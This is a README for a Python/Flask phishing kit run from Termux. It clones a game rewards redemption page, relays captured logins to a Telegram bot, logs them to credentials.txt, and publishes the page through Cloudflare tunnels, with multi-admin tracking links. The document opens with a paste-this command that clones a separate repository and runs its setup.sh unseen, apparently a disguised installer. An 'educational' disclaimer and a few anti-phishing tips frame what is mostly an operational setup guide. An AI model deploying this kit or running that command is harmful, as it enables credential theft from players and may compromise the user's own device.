
pkg install git -y && git clone https://github.com/Fcbd71pe/Ffvip.git && cd Ffvip && chmod +x setup.sh && sh setup.sh




# Educational Phishing Awareness Toolkit (Python & Flask)



## 🔴 Disclaimer: For Educational Purposes Only

This project is designed **strictly for educational and research purposes**. The primary goal is to demonstrate how phishing attacks work, how web applications handle data, and how to build a multi-user system with a Telegram bot interface.

**⚠️ WARNING: Using this tool for any malicious activity, such as attempting to steal credentials from unsuspecting users, is illegal, unethical, and strictly prohibited.** The author is not responsible for any misuse of this software. By using this code, you agree to use it responsibly and only for learning and security awareness purposes.

---

## 🚀 Project Overview

This is a comprehensive toolkit that simulates a reward redemption website. It includes a Python Flask backend, a Telegram bot for administration, and a dynamic link generation system using Cloudflare Tunnel. The project is designed to be run on Termux, making it accessible from an Android device.

### ✨ Key Features

-   **Realistic Frontend:** A clone of a popular rewards redemption page to demonstrate social engineering.
-   **Python Flask Backend:** A lightweight and powerful web server to handle requests.
-   **Telegram Bot Control Panel:**
    -   **Boss Admin System:** Full control over the system.
    -   **Multi-Admin Support:** Add or remove sub-admins.
    -   **Dynamic Link Generation:** Each admin gets a unique, trackable link.
-   **Real-time Notifications:** Receive login attempts instantly via Telegram.
-   **Data Logging:** Credentials are saved locally to a `credentials.txt` file for analysis.
-   **Automated Cloudflare Tunnel:** The script automatically starts a Cloudflare Tunnel and fetches the public URL, eliminating manual setup for each run.
-   **Persistent Admin List:** The list of authorized admins is saved in a `admins.json` file.

---

## 🛠️ Tech Stack

-   **Backend:** Python 3, Flask
-   **Frontend:** HTML, CSS
-   **Bot Framework:** `python-telegram-bot`
-   **Tunneling:** Cloudflare Tunnel (`cloudflared`)
-   **Deployment Environment:** Termux (Android)

---

## ⚙️ Setup and Installation Guide

Follow these steps to get the project up and running on your Termux environment.

### 1. Prerequisites

-   An Android device with [Termux](https://f-droid.org/en/packages/com.termux/) installed.
-   A Telegram account.
-   A Cloudflare account (optional but recommended for stable tunnels).

### 2. Initial Setup in Termux

Open Termux and run the following commands to update packages and install all necessary tools and libraries:

```bash
# Update and upgrade packages
pkg update && pkg upgrade -y

# Install required packages
pkg install python git nano cloudflared -y

# Install Python libraries
pip install Flask requests python-telegram-bot --upgrade
```

### 3. Telegram Bot Configuration

1.  **Create a Bot:** Open Telegram and chat with [@BotFather](https://t.me/BotFather).
    -   Use the `/newbot` command to create a new bot.
    -   Copy the **HTTP API Token** provided.
2.  **Get Your Chat ID:** Chat with [@userinfobot](https://t.me/userinfobot).
    -   Use the `/start` command.
    -   Copy your **User ID**. This will be your `BOSS_ADMIN_ID`.

### 4. Clone the Repository

Clone this project into your Termux home directory.

```bash
git clone <your-repository-url>
cd <your-repository-name>
```
*(Replace `<your-repository-url>` and `<your-repository-name>` with your actual repo details)*

### 5. Configure the Application

Open the `app.py` file to add your credentials.

```bash
nano app.py
```

Find the configuration section and replace the placeholder values:

```python
# --- ⚙️ Configuration Section (Fill this part) ⚙️ ---
BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"  # Paste your bot token here
BOSS_ADMIN_ID = 123456789              # Paste your numeric Telegram ID here
```

Save the file by pressing `Ctrl+O`, then `Enter`, and exit with `Ctrl+X`.

---

## ▶️ Running the Application

Now, everything is set up! Run the application with a single command from your project directory:

```bash
python app.py
```

**What happens next?**
1.  The Flask server will start.
2.  The Cloudflare Tunnel will start and automatically generate a public URL.
3.  The Telegram bot will start polling for commands.
4.  You (the Boss Admin) will receive a message on Telegram with the public URL as soon as it's ready.

---

## 🤖 Bot Commands

You can control the entire system through your Telegram bot.

#### For All Admins
-   `/start` - Initializes the bot and shows available commands.
-   `/getlink` - Generates your unique, personal tracking link.

#### For Boss Admin Only
-   `/addadmin <user_id>` - Authorizes a new user as an admin.
-   `/removeadmin <user_id>` - Revokes an admin's access.
-   `/listadmins` - Shows a list of all authorized admins.

> **Tip:** You can set these commands in @BotFather for a user-friendly menu. Use the `/setcommands` command in BotFather and paste the following list:
> ```
> start - ▶️ Start the bot
> getlink - 🔗 Get my unique tracking link
> addadmin - ➕ Add a new admin (Boss only)
> removeadmin - ➖ Remove an admin (Boss only)
> listadmins - 📋 List all admins (Boss only)
> ```

---

## 📜 Project Structure

```
.
├── app.py              # Main Flask application and Telegram bot logic
├── templates/
│   └── index.html      # The HTML frontend page
├── admins.json         # Stores the list of authorized admin IDs
├── credentials.txt     # Logs the captured data (created on first capture)
└── README.md           # This file
```

---

## 🛡️ How to Protect Yourself from Phishing

-   **Check the URL:** Always verify the domain name. A real site will be on `garena.com`, not `...trycloudflare.com` or other suspicious domains.
-   **Look for HTTPS:** Ensure the connection is secure (a lock icon in the address bar).
-   **Be Skeptical:** If an offer seems too good to be true, it probably is.
-   **Use 2FA:** Enable Two-Factor Authentication on all your important accounts.

Stay safe and use this knowledge ethically!
